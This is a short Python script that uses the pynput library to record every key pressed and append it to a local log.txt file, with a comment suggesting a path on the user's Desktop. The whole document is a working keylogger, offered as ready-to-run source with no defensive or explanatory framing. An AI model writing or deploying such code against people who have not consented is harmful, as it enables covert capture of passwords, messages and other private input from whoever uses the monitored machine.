from pynput.keyboard import Listener

def on_press(key):
    with open("log.txt", "a") as f: #path of your choice e.x: "C:\\Users\\USER_NAME\\Desktop\\log.txt"
        f.write(str(key)+'\n')

with Listener(on_press=on_press) as listener:
    listener.join()
